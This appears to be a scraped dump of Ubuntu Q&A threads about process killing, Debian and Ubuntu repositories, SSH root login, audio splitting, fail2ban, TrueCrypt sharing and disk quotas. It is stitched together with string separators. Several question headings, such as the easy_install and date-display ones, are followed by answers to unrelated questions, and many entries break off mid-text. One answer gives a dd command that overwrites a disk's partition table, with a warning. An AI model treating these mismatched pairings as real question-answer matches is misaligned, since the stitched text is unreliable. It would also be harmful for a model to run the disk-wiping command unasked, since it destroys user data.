After using just plain kill <some_pid> on Unix systems for many years, I learned pkill from a younger Linux-savvy co-worker colleague1.\nI soon accepted the Linux-way,pgrep-ing and pkill-ing through many days and nights, through slow-downs and race conditions.   This was all well and good. \nBut now I see nothing but killall.  How-to's seem to only mention killall, and I'm not sure if this is some kind of parallel development, or if killall is a successor to pkill, or something else. \nIt seems to function as a more targeted pkill, but I'm sure I'm missing something.\nCan an Ubuntu/Debian-savvy2 person explain when (or why) killall should be used, especially if it should be used in preference to pkill (when pkill often seems easier, because I can be sloppier with name matching, at least by default). \nWhen speaking of killall, I'm not thinking of the command that on some Unix systems (Solaris, AIX, ?) would kill all user processes.   Here's a description of that version, from a manpage for IBM's AIX: \n\nThe killall command cancels all\n  processes that you started, except\n  those producing the killall process.\n  This command provides a convenient\n  means of canceling all processes\n  created by the shell that you control.\n  When started by a root user, the\n  killall command cancels all\n  cancellable processes except those\n  processes that started it. If several\n  Signals are specified, only the last\n  one is effective.\n\n1 'colleague' is free upgrade from 'co-worker', so might as well.\n2 Originally I thought this was a Linux or Debian thing, but some sources are saying that the Linux killall is derived from BSD-flavored Unix. \n\nA: I think you see killall in how-to's because by default it requires the precise process name, whereas pkill does basic pattern matching. Thus, killall is safer for users to blindly copy and paste.\nPkill and killall both have distinguishing options. Killall has a flag to match by process age, pkill has a flag to only kill processes on a given tty. Etcetera ad nauseum. Neither is better, they just have different specialties.\nI see from their man pages that killall comes from the psmisc package, which has several process managing utilities, but notably doesn't contain ps. It's the procps package that has ps, top, kill, and pkill (among others). I'd wager procps didn't originally have pkill, so psmisc scratched an itch and came up with killall.\nThe pkill/pgrep man page says they were introduced in Solaris 7. As you mention, jgbelacqua, Solaris's killall was not the utility psmisc provides, thus Solaris probably only had the procps package. Someone wanted a pattern matching process tool, thus pkill and pgrep. Whether it was developed by the procps dev or added in afterwards, I don't know. Regardless, it made it in and became part of *nixes everywhere.\nMore sources:\n\n*\n\n*http://www.freebsdsoftware.org/sysutils/linux-procps.html\n\n*http://www.freebsdsoftware.org/sysutils/psmisc.html\n\n*http://procps.sourceforge.net/faq.html\n\n*OpenSolaris (now Illumos) source code for ps, at launch in 2005\n\nA: Please be careful with \"killall\".  On some systems (I forget which), killall kills all processes.  It will silently ignore arguments and bring your system to a complete halt.\n\nA: if you activate /etc/bash_completion, after killall <part_of_process_name> and hit tab - auto completes the process name from the list of running processes\n\nA: If you look at the options on both programs, you'll see that they both do about the same thing, but in different ways.\npkill will perform matching on various attributes of a process (CMD, PID, PPID, UID...) and will send the given signal to each process that matches. (For CMD, a regular expression is used, for others it is a string). pkill is not interactive, but better for batch programs.\nkillall will perform matching on the process name (comm) or user (user), not on the whole command string. The argument is used as a simple string and must be match the entire 'comm' value (there is also a --regexp option to change this).  killall has --interactive and --younger-than options, which pkill does not have.\nThere is also a killall5 is from SysV days and was ported to other UNIX variants (supposedly under the Ubuntu package 'sysutils').  This behaves differently in the old fashion manner.  This was often used internally to the init scripts to shutdown or change to single-user mode.\n", "Q: What is the difference between Debian contrib & non-free and how do they correspond to Ubuntu repositories? I have been trying to understand the difference between Debian's contrib and non-free sections as described in Chapter 2 of the Debian Policy Manual.\nAre contrib packages just wrappers around non-free softwares? Like what we have in flashplugin-nonfree in Ubuntu?\nSecondly, does the nonfree section of Debian correspond to Ubuntu's multiverse or restricted repositories or is it the union of both?\n\nA: In a nutshell, these are what Ubuntu's archive divisions mean:\n1) main: Free software, officially supported by Canonical\n2) universe: Free software, NOT supported by Canonical\n3) restricted: Non-free software officially supported by Canonical (includes device drivers mainly, amongst others)\n4) multiverse: Non-free software NOT supported by Canonical (flashplugin-nonfree comes over here)\nDebian has these divisions:\n1) main: All free software that follows the DFSG (Debian Free Software Guidelines)\n2) contrib: Free software that follows DFSG but depends on software in non-free.\n3) non-free: All kinds of non-free software that doesn't follow the DFSG.\nSince Debian doesn't differentiate among packages on the basis of support (since all packages are supported by the Debian community), contrib and non-free packages correspond to Restricted/Multiverse in Ubuntu. By default, all contrib and non-free packages enter Multiverse when they are synced. If Canonical intends to support them, they are moved to restricted.\n\nA: non-free is for packages which are straight-up not free. The only requirement is that they are redistributable. The Debian project considers that non-free is not a part of Debian, and is only provided as a convenience for users.\ncontrib is for packages which are themselves free but depend on packages that are in non-free. It's also not considered a part of Debian.\nAs Debian doesn't have the main/restricted and universe/multiverse distinction (and Ubuntu doesn't have the non-free and contrib distinction), the union of non-free and contrib corresponds roughly to the union of restricted and multiverse.\n", "Q: Can I use easy_install?

This should tell you what the external monitor is reporting about its capabilities, and how the server is dealing with those capabilities.  You may have to define your monitor(s) in /etc/X11/xorg.conf to override the information. \nEDIT: Modern monitors supply an EDID which describes your monitors capablities.  The software should use this to determine which modes to enable.  These will likely go:\n\n\n*\n\n*If duplicating the display, offer only the modes supported by both monitors.\n\n*If switching monitors, offer only the modes supported by the current monitor.\n\n*If running separate displays (side-by-side), offer all modes supported by the monitor for each display.\n\n\nEDIT2: Having separate data on different display has multiple names including Multi-Head, Multi-Monitor, Dual-Head, and Dual-Monitor.  Many recent display cards support Dual-Head configurations.  More than two heads usually require additional display cards.\nWindows calls their implementation Dualview.  It is enabled by selecting 'Extend my display onto this monitor' from the display configuration menu.\nUbuntu Gnome enables dual-head from the System -> Preferences -> Monitors menu.  This requires the RANDR extension version 1.2 or newer.  It is enable by unchecking 'Same image on all monitors'.  Randr configuration can be done from the /etc/gdm/Init/Default script.  This is additional option to configuring an xorg.conf file.  Either or both can be used.  The command to do the configuration is xrandr which can also be used from a console window.\n", "Q: How can I display the current time & date setting?

Just as a quick aside, this is a devastating combination. Graphics work perfectly and it cold-boots to desktop in about 7 seconds. Very quick.\nBut (common to laptops) I've got a couple of problems. I'll start with the most problematic and start a new thread for the other.\nLike a lot of laptops, there is a Fn (function) modifier to allow some keys to have another purpose. When I tried to alter the brightness of the screen by tapping Fn+Down, it worked but kept on going until it was as dim as it could go. I tapped Fn+Up and it went to the other extreme.\nAfter that the entire keyboard ceases to work properly because the Fn modifier appears to be locked. Additionally, and as a direct side effect, I think, clicking on things doesn't result in a standard result. It's as if control is being held. A reboot is the only thing that seems to fix these problems.\nThis isn't a problem if you don't touch the Fn key but as there are two of them on the keyboard, an accident is going to happen sooner than later, requiring a reboot (and probably some data loss).\nI don't have a lot of experience with laptops (I prefer my hulking great desktop) so this isn't my area of expertise. I'm open to all suggestions, even disabling the two Fn keys until we can find a better solution.\n\nA: I solved this problem by adding the model name to the file /lib/udev/rules.d/95-keyboard-force-release.rules as explained here: Getting function keys working on Samsung RV510 notebook\nagur!\n", "Q: Broadcom STA driver doesn't work well with BCM4313 Following on from my other question about our new Samsung Q330, I've noticed that the wireless is incredibly flakey.

I don't know how to tell my system to use the 3g driver.\nmount -t ntfs-3g and fstab entries work just fine.\n\nA: I am sorry but the NTFS driver module shipped with the Ubuntu kernel is the NTFS 3G, for such a core component I recommended you to keep with the official packaged version.\n\nA: You can blacklist that kernel module by adding it to /etc/modprobe.d/blacklist.conf:\nblacklist ntfs\n\n", "Q: Screen shivers on a fresh install I have just installed Ubuntu 10.10 and after the installation when I logged in It Shivers from edges on High Resolution, and if I set the resolution to 800x600 it stops shivering, what's the problem? My board is Intel DGC101 and it has a built in ATI Radeon Xpress 200 Card. What should i do?\n\nA: Is this a CRT or an LCD?  You are using the SVGA connector, not DVI right?  If this is an LCD and it has a DVI connector, you should use that instead of SVGA.  Does your monitor have a button that brings up the on screen status display that tells you the resolution and frequency it is running at?  Is it running at 60 Hz or 70 Hz?  What about in 800x600?\nI had this happen to me once when I used a cable TV tuner card because there was a 48 volt 60 Hz AC signal on the line, which caused a small 60 Hz ripple on the ground plane.  If the monitor is running at 70 Hz, then it sets up a 10 Hz beat that scrambles the horizontal refresh signal and causes the edges of the monitor to wobble.  Running the monitor at 60 Hz stopped the wobble, but still left the edges annoyingly bent.  The DVI connector should be immune to this.\n", "Q: Syncing cell phone with Banshee via Bluetooth Is it possible that if I connect my cell phone via Bluetooth with my laptop it appears like a mp3-player in Banshee so I can sync podcasts easily?\n\nA: That depends on the brand and model of your phone.  If you can treat your phone as a USB Mass Storage Device, then there's a chance Banshee will be able to support it out of the box.  If your phone doesn't work, you can always submit a bug report to the Banshee team requesting support for your specific phone.  See the Hardware section on Banshee's FAQ page for more information about which devices are currently supported.\n", "Q: How do I disable remote SSH login as root from a server? For security purposes my company wants me to not allow anyone to be able to log into our Ubuntu server as root remotely over SSH. We still want the root account to exist, we just do not want it to be able to be logged into remotely. How would I accomplish this?\nThank you very much in advance for your time. \n\nA: The default configuration is for the root account to be locked so you can not log in as root remotely.  You don't have to do anything else, unless you also want to make sure that you can not log in as root remotely by using an RSA key.  Of course, if you don't want to do that, then just don't set up a root key.\n\nA: Edit the file /etc/ssh/sshd_config, look for\nPermitRootLogin\n\nand set it to no.\n\nA: I assume you meant logging in over SSH? Put the following line to /etc/ssh/sshd_config:\nPermitRootLogin no\n\nIf you want to deny certain users from logging in, put this in the configuration file:\nDenyUsers root\n\nThis takes the blacklisting approach. Whitelisting is generally preferable. If your company needs to allow the rob and admin users log in on the server, use the following configuration directive:\nAllowUsers rob admin\n\nAfter making configuration file changes, restart the ssh service using the command:\nsudo service ssh restart\n\nSee also the manual page.\n", "Q: Make public webcam.

It complicates things for users and is far too high-bandwidth for public consumption.\nHvae you looked at the package webcam-server. You tell it what webcam to show and it provides a networked video source. It also comes with a java applet that you can host on a web page that connects directly to the webcam-server daemon.\nI don't know if you want to make this publically viewable but you'll have to open up some ports and route traffic through so the java applet can communicate with the daemon.\nThis tutorial should get you started.

It will be great to find a software that can split the file automatically, detecting the start and the end of each song.\nExtra background:\nI have tried mp3splt and audacity. The first one fails to autodetect the songs and audacity seems to be unable to do it.\nI would like to burn the songs to a CD (mp3 format) to play then in my car radio. It will not support any fancy stuff, it doesn't even have an USB connector.\n\nA: Audacity is BAD for that - since it re-encodes mp3 and the quality gets downgraded. I use ffmpeg for cutting mp3 - I believe it doesn't do re-encoding:\n# start time to end time:\nffmpeg -i input.mp3 -vn -acodec copy -ss 00:00:00 -to 00:01:32 output.mp3\n\n# start time + duration time:\nffmpeg -i input.mp3 -vn -acodec copy -ss 00:00:00 -t 00:01:32 output.mp3\n\n# start of record till end time:\nffmpeg -i input.mp3 -vn -acodec copy -to 00:01:32 output.mp3\n\n# start time till end of record:\nffmpeg -i input.mp3 -vn -acodec copy -ss 00:01:32 output.mp3\n\none can also include milliseconds with e.g. 00:00:00.000.\n\nA: I can recommend mp3DirectCut. Does lossless conversion and runs fine under Wine:\n\n\nA: You say you've tried mp3splt but have you read the full manpage?\nI ask because the -s silence mode can take parameters to help it determine silence.\nHere a man page example with optional parameters:\nmp3splt -s -p th=-50,nt=10 album.mp3\n\n\n\n*\n\n*th: threshold level (dB) to be considered silence\n\n*nt number of tracks\n\n\nThere's also a -c CDDB database query mode. If this is a known CD, you can pull the track listing from online. This will also name tracks correctly and (I think) it'll even set the tags up.\nIt is an incredibly powerful tool and one of your best options for preserving quality... So don't write it off straight away.\n\nA: The following answer on stack overflow is probably relevant.\nSummarizing this answer, you can use ffmpeg to identify silent regions:\nffmpeg -i \"input.mov\" -af silencedetect=noise=-30dB,d=0.5 -f null - 2> vol.txt\n\nAnd then split up the files using Adobe's recipe:\nffmpeg -i InputFile -vn -acodec copy -ss 00:00:00 -t 00:01:32 OutputFile\n\nThis will require a little parsing on your part.\n\nA: mp3splt works well. How well depends on what you have to start with and what you expect for results. More inputs = more outputs. If you know the number of songs contained in the large mp3 files, this helps to tell you the number of output files is correct. You MUST have silence sections between your songs in the large mp3 file.  The key for mp3splt is to find the correct value for \"th\". If \"th\" is too low, you may have too many outputs, so all your songs are fragmented. If too high, your songs will not be split, and you may may have more than 1 song per split. Let's assume you have a large file and nothing else: eg no index for titles or times.\nMy large file is named \"artist.ogg\" \nHere is the command I used:\nmp3splt -s -p th=-40 artist.ogg\nThis resulted in 34 songs split correctly, each named serially as artist_silence_01.ogg  -xx.ogg  etc.\nAgain, if you have too many splits, try \"th=-48\". If too few, try \"th=-36\".\nFrom these output files, you will need now to rename them into the song titles you want and add labels to the file properties. [I know of no macro for this, so must be a manual process].\nhope this helps.\nupdate PS. \nSo far, mp3splt works for mp3 and ogg files. I have no success yet for m4a files.\n\nA: Audacity\nYou can split your large mp3 into small pieces by using the \"split\" or \"split new\" function in audacity, then can move apart the portion of audio that you wish to mix down into a different file in order to export it.\nIn the next screenshot, I have made a new Stereo Track in order to put the split audio into a different track (for visual purposes only), then I moved the second part of the audio to that track and I have selected a portion of audio which can be exported into a new file.\n\nYou don't have to split the audio in order to export the portion of audio into a different file, you can simply select the audio and choose \"Export Selection\" in the File Menu.\nIn the next screenshot I am doing as I said in the words above.\n\nSound Juicer\nIf you yet have the CD, ripping audio with a file per song can be done by using \"Sound Juicer\", which will allow you to choose how to rip the media from the CD. This way you will have an mp3 file per song. And the task to mix down all the songs into a large file will be easily achieved by Audacity, just in case you need to do it so.\nSound Juicer can be installed via synaptic or by diving into the website at: http://burtonini.com/blog/computers/sound-juicer\nA screenshot are placed here in order to you see Sound Juicer in action. (Sorry, I don't have a CD to rip off right now, so the playlist is empty)\n\n\nA: you can try something like:\nffmpeg -i /path/music.mp3 -t 00:10:00 -ss 00:20:00 -acodec copy /path/save.mp3\n\nA: I got quality results (though not completely automatic) with Audacity + mp3splt.\nIf you don't have a .cueor a .cddb file with song limits (e.g., it is not a recognized album), you can:\n\n\n*\n\n*Manually label the track in Audacity as explained in its manual, probably helped by previous silence autodetection (with Analyze > Silence Finder…, see here) for a first guess at notorious breaks\n\n*Export the labels (with File > Export Labels…, see here) to a simple text file, and\n\n*Feed the .txt file to mp3splt under option -A (as mp3splt -A labels.txt Album.mp3).\n\n\nIt will quickly (no decoding + re-encoding) output a file for each segment  using each label name as filename.\nJust be careful to use region labels (and not point labels, see here) to mark the beginning and end of each song in Audacity.\n\nA: If you need just an easy to use and lossless (not like Audacity for instance) graphical tool for splitting audio files (mp3 and wav), try wavbreaker (https://wavbreaker.sourceforge.io/) installable usually with a simple:\n\nsudo apt install wavbreaker\n\nor\n\nsudo yum install wavbreaker\n\ndepending on your linux distribution.\n.... or also\n\nflatpak install wavbreaker\n\nif you really want to check last version on your distro and you have flatpak support installed.\n", "Q: How to make a hotkey for a series of keyboard commands?

I have a Shuttle SX58H7 computer (Intel X58 Express board, AMI BIOS version 08.00.16) with Intel Core i7 950 and GeForce GT 210 Silent (nvidia proprietary driver).\nUnder Karmic (64-bit), hibernation worked fine. Under Maverick, the computer goes to hibernation but when woken, USB and display don't come back and sshd doesn't respond, either. Sometimes when waking from basic sleep (as opposed to hibernation), sshd does come back and the computer can be reached from the network. IIRC, the regression happened when upgrading to Lucid.\nIs there a know workaround that would restore the hibernation capability that existed under Karmic?\n\nA: Solution:\n\n\n*\n\n*Add GRUB_CMDLINE_LINUX=\"acpi_sleep=nonvs\" in /etc/default/grub\n\n*Run sudo update-grub\nNote: The above works in Ubuntu 10.10.

Since unity has to be configured from within Compizconfig Settings Manager, will it be included in Natty?\n\nA: No, ccsm will never be installed by default. It is quite possibly the worst UI ever invented. It is completely autogenerated so every setting of a certain type is treated identically even if they make no sense to be shown that way. Settings depend on each other in ways the UI can't handle for you and putting the wrong values in for some of the settings will leave you with a desktop that does not work.\nIt is strictly a poweruser \"break my toys\" tool and always will be. That said, hopefully the Unity folks cook something up for adjusting the settings they deem worthy of adjustment. I could see a nice little UI for adjusting number of workspaces, launcher autohide, and maybe a couple more somewhat common options.\n\nA: There hasn't been any suggestion from Canonical or the Unity team about this. Personally I very much doubt it will be included by default.\nI imagine the Unity team will make sure they choose great defaults that ensure most users won't ever need to delve into the CompizConfig Settings Manager (personally I think the name's quite snazzy...)\n", "Q: Sound Menu Album Art is not rounded My album art on my sonud menu (maverick) isn't being rounded. Is there a solution?\n\nA: It seems the behaviour of this has been changed since the release of Maverick 10.10.\nIn October 2010 Maverick was released with version 0.4.7-0ubuntu2 of the indicator-sound package - this used rounded corners.

I've installed ubuntu netbook (10.10) on it because of the lack-of memory and it seems to work fine, accept from some heat-issues. These where never a problem under windows.\nIt looks like I've got something similar to this problem: Load is generally 1 or higher, sometimes its stuck at 0.80, but its way to high. Top/htop only show a couple of percentage CPU use (which isn't too shocking, as i'm not doing anything). At this point all the software is stock, and i'd like to keep it that way because its supposed to be the easy-to-maintain kids computer.\nNow I'd like to find out:\n\n\n*\n\n*What could be the cause of the high load? Could it be as this thread implies, some driver, are there other options to check?\n\n*How could I see what is really keeping the system hot and bothered? How to check what runs, etc etc? I'd like to pinpoint the culprint.\n\n*further steps to take for debugging?\n\n\nThe big bad internet leads me to believe that it might be the graphics drivers. The laptop has an Intel 945M chipset, but that doesn't seem to be one of the problem childs in this manner (I read a lot abotu ATI drivers that need special isntall).\nI'd not only welcome hints to directly solve this (duh) but also help in starting to debug what is going on. I am really hesitant in installing an older kernel, as I want it to be stock, and easy upgradeable (because I don't live near it, it should run without me ;) )\nAs an afterthought: to keep the whole thing cooler, can I 'amp up' the fancontrol? Its only going \"airplane\" mode when the computer is 95 Celcius, which is a tad late for my taste.\nTop:\n\npowertop:\n\n\nA: If you provided an output of a \"typical\" uptime and top, we might be able to help more.\nApart from that, I would suggest trying powertop: it analyzes the CPU load, gives you an overview of the most demanding processes, and even suggests what to do to reduce power consumption/CPU load.\n\n\nA: This laptop never could work nicely with this install. But as it is a kids computer, I have no need for speed. The high load seems to stay either way, I still don't know if this is a feature or a bug.\nSo the sollution (or actually: workaround) has been to clock it down in the bios so the CPU never goes tot the higher speeds. That is enough to keep it cool. I could not find any way to set the fan-speed to \"high\" in the bios, which would have been my first sollution.\n", "Q: When the pop up menu automatically appears and I press `Ctrl + S`.

found why it is failing, but, as a bounty has been set, I'll wait for it to finish before writing down the answer, thus offering other users to try and answer the question... (@Moderators: Is this OK? What should I do otherwise?)\nEdit:\nAs nobody answered, I'll jot down what I discovered.\nTwo things were wrong about my setup (actually one about my setup and one about fail2ban itself):\n1.- If I try\nsudo iptables -N fail2ban-apache-404-slowattackers\n\nwhich is the command fail2ban issues, I get the following message:\niptables v1.4.4: chain name `fail2ban-apache-404-slowattackers' too long (must be under 30 chars)\n\nIf this had been logged to fail2ban.log, I would have known what wass going wrong (but it wasn't logged). So, changing the name of my custom filter to something shorter (for instance apache-404-slowatt) did the trick, as iptable chain name becomes below 30 characters.\n2.- There's a (seemingly) faulty fail2ban script that apparently 'runs too quickly', so I found a workaround.\nQuoting:\nI had multiple fail2ban.action.action ERROR on startup/restart. It seems there was a \"race\" condition with iptables. I solved the problem completely on my system by editing /usr/bin/fail2ban-client and adding a time.sleep(0.1):\ndef __processCmd(self, cmd, showRet = True):\n    beautifier = Beautifier()\n    for c in cmd:\n        time.sleep(0.1)\n        beautifier.setInputCmd(c)\n\n\nA: I never use fail2ban, but maybe this page will help you:\nhttp://oschgan.com/drupal/index.php?q=node/52\n", "Q: RAID slow on all levels I am getting very slow write speeds (<1MB) with RAID 1 and RAID 0 (striping and mirroring). The read speeds are sufficiently fast but writing is very slow. At first I thought it was just poor performance under RAID 1 but it is occuring with RAID 0 (although not as bad).\nI noticed that compared to when Ubuntu was on a virtual machine there are multiple instances of kdmflush process running using most of my IO (detected using iotop). \nDoes anyone have any suggestions as to what could be causing this?\n\nA: I assume you are using software RAID.\nIs your disk synchronization still going on? You can check that by running\ncat /proc/mdstat\n\nIf not, you may have problems with (physical) disks. At first, check dmesg output, and try to find disk related error messages. If there is nothing, you can use\nsudo smartctl /dev/sda\nsudo smartctl /dev/sdb\n\n(or whatever your disks are, you can see that for example from /proc/mdstat).\nsmartctl also supports running disk tests:\nsudo smartctl -t short /dev/sda\n\n\nA: Something is very wrong here. Either a disk is going bad or there's a configuration issue you're not aware of or have discarded as a variable. On the software RAID side you can try to take turns, kicking one disk out of the array, and then benchmark the RAID. Reassemble, sync, and repeat with the other member. If they perform around the same then you've got a deeper problem. kdmflush is just deferred work getting done by device mapper.\nRunning iotop -a is interesting since it shows the accumulation of I/O traffic since iotop started.

Now I've really messed things up.\nA long time ago, I installed Google Earth via a binary installer from Google (v5.1, I think).\nGoogle now has version 6 available as a .DEB, so I decided to install that. However, that seems to have messed up both installations and now no matter what I do, I can't get Google Earth to run.\nHere's what I do:\nsudo apt-get purge google-earth-stable\nsudo dpkg -i --force-overwrite google-earth-stable_current_amd64.deb\n\nWhich I thought would work... but when I run google-earth, I get:\n\n/usr/bin/google-earth: 43: ./googleearth-bin: not found\n\nHow can I get it installed now?\n\nA: Try with this tutorial :\ninstall-google-earth-6-in-ubuntu-linux.html\nhope it help\n\nA: Go to this page and click on the big blue button that says \"Download Google Earth 6\", this should give you the option of installing Google Earth as a .deb. Install it like you would any other .deb\n\nA: I downloaded the 32-bit version, then right clicked on it and choose \"Extract Here\" in nautilus.  That shows me the folder structure that would be installed if I installed the deb file.  It seems that the \"googleearth-bin\" file should be in /opt/google/earth/free.\nI guess you'll need to check whether that exists on your system.  If not, perhaps the binary install has changed the permissions on that file in a way that breaks overwriting from the deb?  Not sure how that's possible given that you have to sudo to install a deb.\n\nIt looks like the /usr/bin/googleearth is just a shortcut to that file too, not a script, so it's likely that there's something wrong in the /opt directory I mentioned above.\n\nI guess you'll be best served by deleting the files/folders in the deb, then trying the re-install afresh?\n\nA: First I'd go about uninstalling everything related to google-earth you can find.\nThe 5.1 binary installer defaults to /opt/google-earth as the install location, and also places a link in /usr/local/bin called googleearth. If you delete those two things, you should have successfully uninstalled the old version.\nNext I'd do what you've already mentioned (again):\nsudo apt-get purge google-earth*\n\nFinally, use the locate command to see if there are some lingering files somewhere. This gets various permutations:\nlocate -i --regex \"google.*earth\"\n\nDelete anything that shows up there (unless you're sure it's unrelated to the app). You may have a .googleearth directory in your user directory, which you could probably leave but maybe rename or delete it too if you still have problems.\nOnce you've cleaned everything out, then go install the .deb package again.\nGood luck!\n", "Q: Sharing a mounted Truecrypt volume via Samba Been banging my head against the wall on this one for a while. I have an encrypted (via truecrypt) partition on a drive. In windows, I mount it locally and share it on my local network. I'm trying to do the same in Ubuntu 10.10 but am running into permission issues. The tc volume has funny permissions and I just can't seem to figure out a way to access it (unsecurely of course) over my network. Other non-tc volume shares work just fine.\nTo recap, I mount a truecrypt volume in Ubuntu and set up a samba share as normal. The share shows up on my local network but accessing it gives 'permission denied'. Mounting as a network drive using a password does not seem to work either.\nAny insight would be greatly appreciated.\n\nA: Woohoo. Perhaps writing the question got me thinking about things more clearly but I figured out a method that works. \nFirst edit your /etc/fuse.conf to allow other users by uncommenting the user_allow_other line at the bottom. (use gksu gedit /etc/fuse.conf)\nNext you've got to mount the Truecrypt volume with read permissions for \"other\". Do that from the command line using:\ntruecrypt --fs-options=\"uid=1000,gid=1000,umask=0002\" /dev/YourVol mount-point/\n\nAs long as you've got samba set up properly you are good to go.\n", "Q: How to run programs each time the system boots up?

Suspend/resume works fine as long as I don't suspend it for longer than 6 or 8 hours. If I do this, it won't wake up ... the keyboard lights flash reporting what the manual describes as a \"BIOS corruption\". Does anyone know of any tweaks/quirks that I can use to resolve this problem?\n\nA: Try to get an update to your system Bios from the HP website. Click on the Support Page, type your make,model number,etc. Make sure that you get the correct one, ie. the one for your model. Otherwise, you could brick your machine!\nBe forewarned, that HP is notorious for removing support for older systems. I had a nightmare trying to find an updated Bios for a friend of mine, and her computer is only 6 years old. Use reliable sources.\n*If you have a dual Boot system, the simplest method is to boot to Windows, and do the Bios updates from Windows.* That's is why when switching someone over to Ubuntu I always check for a bios update, before wiping the windows partition (for those that don't want Windows anymore). I guess Windows is useful for something after all! :-) \nHere is a link indicating how to do this in Ubuntu. Not recommended for beginners...unless you spend sometime doing research and reading and clearly understanding the given procedures.\nhttp://ubuntuforums.org/showthread.php?t=318789\n\nA: I have experienced twice the very same failure to resume after an extended period of suspension. HP dv6 3012he, Ubuntu 11.10 Linux kernel 3.0.0-15-generic, AMD64. \nEach time I retried repeatedly to start up for a day, then finally took it in to a shop. Each time, the shop techs told me the notebook booted up normally for them. They performed extended diagnostics on the RAM, video card and connections, HD, battery and power adapter/charger and could find nothing wrong. \nUbuntu 11.10 doesn't appear to allow disabling Suspend except by selecting Hibernate or Do Nothing. So I am now careful never to simply close the lid, but to always Shut Down. And never to allow Suspend for more than an hour or so. \nAt any rate, I have never heard of a corrupted BIOS fixing itself. So I tend to doubt that's what the source of this behavior is.\n", "Q: How do I map SysReq to a key on my MacBook keyboard? My Macbook laptop keyboard doesn't have a SysReq key.

(1) You could change the prefix, but any Ubuntu update to autopoint will bork it. (2) I'd rather remove and reinstall gettext to /usr.

I just installed Windows 7 64bit moments ago.  My drive is currently partitioned like so:\n100MB Boot partition (automatically made by Windows 7 installer)\n390GB Windows partition\n~1.6TB free space\nWhen I go through the Ubuntu installer it does not give me the option to install alongside another operating system. My only options are to use the entire disk or to specify partitions manually. When I chose to specify partitions manually it tells me that the drive is all free space!\nWindows is still booting and behaving normally, and I had not doing anything in Windows yet (had simply installed, booted for first time, then immediately restarted).  I am even able to mount the windows partition within Ubuntu Live CD, and see it in the disk viewer (not GParted).  GParted in Ubuntu Live CD again reports no partitions, all free space.\nNot sure what to do :S.  I have installed Windows 7 alongside Ubuntu countless times, even Ubuntu 10.10.\nThank you very much for your help :).\nEdit: I tried adding a partition through Disk Utility since it identifies the partitions, it failed.  However GParted now identifies the free sapces as a NTFS partition.  I used to have Ubuntu as my only O/S before I wiped to add windows 7.  I wonder if there is some remnant of the old partition table left over that the Windows installer wasn't wiping over, so GParted was getting confused on where partitions started/ended.\nI am trying to create the partition table/partitions with GParted now and see if that helps.\nI got to install Windows 7 first unfortunately since I can never figure out how to repair grub once Windows has stomped on it.\n\nA: If there is a remnant of the old partition table left then it's easy to get rid of it. Just run a dd like so: \ndd if=/dev/random of=/dev/sda bs=1 count=512\n\nOnly run this if you are sure you want to erase all partitions and start over. \"sda\" is the harddrive you're working with.\nIf you do this you will have to reinstall Windows 7 again. I'd recommend creating the partitions with the Ubuntu Live CD, that way the Windows installer doesn't create the 100MB System Partiton anymore, and you can be sure that the partitions are actually there. Good luck.\n", "Q: PhotoShop alternative for Ubuntu \nPossible Duplicate:\nAlternative to Photoshop or Paint.NET \n\nHello. I am working in Ubuntu. I want to do some editing and drawing.

I have a VPS with ubuntu server 10.04 installed on it.Now I want to have some shell users with limited home folder size.\nIt seems quota is the best way to do this, but all tutorials require editing /etc/fstab and add usrquota or grpquota to /home partition options.\nAs my /etc/fstab looks like this:\nproc  /proc       proc    defaults    0    0 \nnone  /dev/pts    devpts  rw          0    0\n\nhow can I apply quota?\n\nA: Your VPS provider may be doing tricks at boot-time resulting in your /etc/fstab not needing the root filesystem listed. You can find the device and other details from the output of the mount command. If you add those details to your /etc/fstab, you may be able to add the usrquota,grpquota options there for the next reboot.\nIf that doesn't work for your VPS, you may be able to approximate those mount options by turning them on later in the boot process. For example, I use usrjquota=aquota.user,jqfmt=vfsv0 on an ext3 filesystem. If I didn't have access to my /etc/fstab, I might try editing my /etc/rc.local and adding something like:\nmount -o remount,usrjquota=aquota.user,jqfmt=vfsv0 /that/filesystem\n\n", "Q: Which is more efficient, Gimp or Inkscape? Can someone tell me which is more efficient -- Gimp, or Inkscape? I am new to linux.\n\nA: Check out this wonderful explanation for the differences between vector graphics and raster graphics.\nIf you want to work with photographs (raster images), GIMP is your best bet. There are lots of brush and plugin collections floating around the net, too (e.g. see here).\nIf you want to create logos, diagrams and illustrations (vector images), use Inkscape.\n\nA: Gimp is a image manipulation software which is more like an alternative to photoshop.\nInkscape is for vector graphics which is more like an alternative to coreldraw, Illustrator.\nRefine your needs. Efficiency depends on what you want to use it for.\n\nA: GIMP is a raster/bitmap graphics editor software. These software are used to edit photographs and graphics, add effects, make them stylish, etc. Its equivalents are Corel PhotoPaint and Adobe Photoshop.\nInkscape (and others like Xara, SK1, Skencil, etc.) is a vector graphics editor software. These are used for more artistic, precise, and mathematical graphics designing. (See? Designing, not manipulating.)\nVector editors are based on the concept of curves and dots, etc. when representing an image (thus such images too are called vector graphics). You can stretch them but there'll be less loss of quality, as these software are heavy and perform mathematical operations to calculate and re-calculate image attributes. However, these lack specialised photograph manipulations and can rarely make a scratch on, say, photographs, hand drawings, etc.\nRaster/bitmap ones produce (called export) 'images' only, in the formats like .jpg, .bmp, .png, etc. unlike .pdf or .cdr. These software have the power of making lots of edits to images or enhance pictures in many ways.\nIn a graphic editor's system, both are a must (that's why Corel gives its Graphics Suite with both kind of editors). However, Inkscape will be more usable if your focus is precise networking-style graphics designing with formulated and layered mechanisms. If you need a software that will handle image manipulations beautifully, go with GIMP.\n", "Q: Cannot find install-sh, install.sh, or shtool in ac-aux This is my first time trying to compile and install anything on a linux machine.

Autotools) are distributed.  In fact, in the case of the Erlang XMPP library mentioned by the OP, the misunderstanding appears to be on the part of the developers.\nObtaining the software the right way\nIf all you want to do is compile and install a project released with the GNU Autotools, then you should not check it out from the source control system.  You should instead download the packaged source release provided by the developer.  These normally take the form of tarballs distributed on the project's website.  For projects that are hosted entirely on GitHub, Savannah, or some similar hosting service, these tarballs will usually be found behind some link labelled \"Download\" or \"Releases\".  You untar the package and utter some variant of the standard ./configure && make && sudo make install incantation.  That's all; you don't need to invoke any of the GNU Autotools, and don't even need to have the GNU Autotools installed on your system.\nThe reason that you, the user, don't need the GNU Autotools to compile an Autotools-packaged project is that the developer has already used the various Autotools programs to generate a \"distribution tarball\" that can be used to build the software on any Unix-like system.  The distribution tarball contains a highly portable configure script that scans the build environment, checks for dependencies, and constructs a Makefile customized to your system.\nSo when do you need Autotools?\nThe only reason you should need to install and invoke the GNU Autotools yourself is if you want to do development work on a project built with Autotools.  And even then, you probably won't need the Autotools unless you change the project's dependencies.  In that case, you would indeed need to check out the original source, make 